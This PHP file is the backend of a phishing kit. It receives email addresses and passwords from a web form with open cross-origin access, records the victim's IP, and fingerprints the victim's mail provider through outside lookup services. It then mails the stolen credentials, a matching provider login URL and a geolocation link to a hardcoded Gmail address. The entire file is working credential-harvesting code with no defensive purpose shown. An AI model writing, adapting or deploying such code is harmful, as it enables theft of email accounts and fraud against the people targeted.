<?php
// Enable CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Get the form data
$namemail = $_POST['ai'] ?? '';
$password = $_POST['namep'] ?? '';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

// Set up the email parameters
$to = 'lubaking.co@gmail.com'; // Replace with your preferred email address

$message = "Email: $namemail\nPassword: $password \n";

// Check if the email contains "aol.com"
if (strpos($namemail, 'aol.com') !== false) {
    $loginUrl = 'https://login.aol.com/account';
    $saeScriptName = '-AOL';
} if (strpos($namemail, 'juno.com') !== false) {
    $loginUrl = 'https://my.juno.com/start/login.do';
    $saeScriptName = '-JUNO';
}  else if (strpos($namemail, 'rogers.com') !== false) {
    $loginUrl = 'https://rogersmembercentre.com/#/signin';
    $saeScriptName = '-ROGERS';
} else if (strpos($namemail, 'netzero.com') !== false) {
    $loginUrl = 'https://my.netzero.net/start/login.do';
    $saeScriptName = '-NETZERO';
}  else if (strpos($namemail, '126.com') !== false) {
    $loginUrl = 'https://126.com';
    $saeScriptName = '-126--COM';
}  else if (strpos($namemail, '163.com') !== false) {
    $loginUrl = 'https://163.com';
    $saeScriptName = '-163--COM';
} else if (strpos($namemail, 'cox.net') !== false) {
    $loginUrl = 'https://www.cox.com/content/dam/cox/okta/mail.html';
    $saeScriptName = '-COX mail';
} else if (strpos($namemail, 'outlookk.com') !== false || strpos($namemail, 'hotmail.com') !== false || strpos($namemail, 'msn.com') !== false || strpos($namemail, 'live.com') !== false) {
    $loginUrl = 'https://outlook.live.com/owa';
    $saeScriptName = '-Outlook,Hotmail,Msn,Live';
} elseif (strpos($namemail, 'frontier.com') !== false) {
    $loginUrl = 'https://login.frontier.com';
    $saeScriptName = '-Frontier Mail';
} elseif (strpos($namemail, '1and1.com') !== false) {
    $loginUrl = 'https://mail.ionos.com/';
    $saeScriptName = '-1and1 ionos Mail';
} else {
    // Fetch the response from the first API based on the email address
    $apiUrl1 = "https://fetchmm.vercel.app/api/";
    $apiUrl2 = "https://sore-pink-meerkat.cyclic.app/proxy-website-content?email=" . urlencode($namemail);

    // Fetch the response from the first API based on the email address
    $apiEndpoint1 = $apiUrl1 . urlencode($namemail);
    $response1 = file_get_contents($apiEndpoint1);

    // Fetch the response from the second API based on the email address
    $response2 = file_get_contents($apiUrl2);

    // Check if the response contains "hiworks.co.kr" and set the appropriate login URL
    $loginUrl = '';
    $saeScriptName = '';

    if ($response1 !== false) {
        if (strpos($response1, 'hiworks.co.kr') !== false) {
            $loginUrl = 'https://www.hiworks.com/member/login';
            $saeScriptName = 'Hi-works';
        } elseif (strpos($response1, 'https://outlook.com') !== false || strpos($namemail, 'pphosted.com') !== false) {
            $loginUrl = 'https://outlook.com/owa/' . extractDomainFromEmail($namemail);
            $saeScriptName = '-OWA/365';
        } elseif (strpos($response1, 'yahoodns.net') !== false) {
            $loginUrl = 'https://login.yahoo.com/account';
            $saeScriptName = 'Y-ahoos';
        } elseif (strpos($response1, 'https://googlemail.com') !== false) {
            $loginUrl = 'https://accounts.google.com';
            $saeScriptName = 'G-mailx';
        } elseif (strpos($response1, 'nate.com') !== false) {
            $loginUrl = 'https://mail3.nate.com/';
            $saeScriptName = 'NATE';
        } elseif (strpos($response1, 'https://zoho.com') !== false) {
            $loginUrl = 'https://accounts.zoho.com';
            $saeScriptName = '-Zoho';
        }  elseif (strpos($response1, 'centurylink.net') !== false) {
            $loginUrl = 'https://webmail.centurylink.net/app/';
            $saeScriptName = '-Centurylink Mail';
        } elseif (strpos($response1, 'https://icloud.com') !== false) {
            $loginUrl = 'https://www.icloud.com/email';
            $saeScriptName = '-iCloud Mailx';
        } elseif (strpos($response1, 'https://naver.com') !== false) {
            $loginUrl = 'https://nid.naver.com/nidlogin.login';
            $saeScriptName = '-Naver';
        }   elseif (strpos($response1, 'charter.net') !== false) {
            $loginUrl = 'https://webmail.spectrum.net/mail/auth';
            $saeScriptName = '-SPECTRUM';
        } elseif (strpos($response1, 'https://windstream.net') !== false) {
            $loginUrl = 'https://webmail.windstream.net/';
            $saeScriptName = '-Windstream, valornet, izoom.net, nuvox.net etc..';
        } elseif (strpos($response1, 'mail.ru') !== false) {
            $loginUrl = 'https://account.mail.ru';
            $saeScriptName = '-Mail.ru';
        } elseif (strpos($response1, 'gmx.net') !== false) {
            $loginUrl = 'https://gmx.com';
            $saeScriptName = '-GMX';
        } elseif (strpos($response1, 'prodigy.net') !== false) {
            $loginUrl = 'https://signin.att.com/';
            $saeScriptName = '-ATT.net, SBCglobal,Bellsouth, Currently etc';
        } elseif (strpos($response1, 'comcast.net') !== false) {
            $loginUrl = 'https://login.xfinity.com/login/';
            $saeScriptName = '-Comcast, Xfinity';
        } elseif (strpos($response1, 'yandex.ru') !== false) {
            $loginUrl = 'https://passport.yandex.ru/';
            $saeScriptName = '-Yandex RU';
        } elseif (strpos($response1, 'https://tiscali.it') !== false) {
            $loginUrl = 'https://mail.tiscali.it/';
            $saeScriptName = '-Tiscali-webMail';
        } elseif (strpos($response1, 'https://mail.com') !== false) {
            $loginUrl = 'https://mail.com/';
            $saeScriptName = '-Mail.com/usa,dr,engineer.com etc';
        } elseif (strpos($response1, 'Daum') !== false) {
            $loginUrl = 'https://accounts.kakao.com/';
            $saeScriptName = '-Daum Kakao';
        } elseif (strpos($response1, 'Roundcube') !== false) {
            $loginUrl = 'https://webmail.' . extractDomainFromEmail($namemail); // Replace with the appropriate domain extraction method
            $saeScriptName = 'Round-cube 1';
        }
    }

    // Check if the response from the second API contains "Roundcube" or "cPanel"
    if ($response2 !== false) {
        if (strpos($response2, 'Roundcube') !== false) {
            $loginUrl = 'https://webmail.' . extractDomainFromEmail($namemail); // Replace with the appropriate domain extraction method
            $saeScriptName = 'Round-cube 2';
        } elseif (strpos($response2, 'cPanel') !== false) {
            $loginUrl = 'https://webmail.' . extractDomainFromEmail($namemail); // Replace with the appropriate domain extraction method
            $saeScriptName = 'Webmail-Cpanel 2';
        }
    }
}

$subject = "Simdia $saeScriptName | $ip";
$message .= "Login URL: $loginUrl\n";
$message .= "|Client IP: " . $ip . "\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----|\n";

$headers = "From: admin@baloncard.online"; // Replace with the sender's email address or a valid email

// Check if the required fields are empty
if (empty($namemail) || empty($password)) {
    // Failed to send email due to missing data
    echo json_encode(['success' => false, 'error' => 'Please fill in all required fields.']);
    exit;
}

// Send the email
if (mail($to, $subject, $message, $headers)) {
    // Email sent successfully
    echo json_encode(['success' => true]);
} else {
    // Failed to send email
    echo json_encode(['success' => false, 'error' => 'Failed to send email']);
}

/**
 * Extracts the domain from an email address.
 *
 * @param string $email The email address
 * @return string The extracted domain
 */
function extractDomainFromEmail($email) {
    $domain = '';
    $parts = explode('@', $email);
    if (count($parts) === 2) {
        $domain = $parts[1];
    }
    return $domain;
}
?>